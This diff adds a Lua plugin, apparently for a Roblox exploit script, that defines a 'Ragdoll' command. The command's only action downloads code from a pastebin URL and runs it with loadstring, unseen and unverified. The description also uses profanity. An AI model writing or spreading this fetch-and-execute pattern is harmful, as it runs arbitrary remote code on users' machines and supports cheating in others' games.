@@ -1,0 +1,15 @@
+local Plugin = {
+    ["PluginName"] = "Ragdoll",
+    ["PluginDescription"] = "It ragdolls its that fucking simple.",
+    ["Commands"] = {
+        ["ragdoll"] = {
+            ["ListName"] = "ragdoll",
+            ["Description"] = "Self Explainitory",
+            ["Aliases"] = {},
+            ["Function"] = function(args, speaker)
+                loadstring(game:HttpGet("https://pastebin.com/raw/NVf0Rja2", true))()
+            end
+        }
+    }
+}
+return Plugin
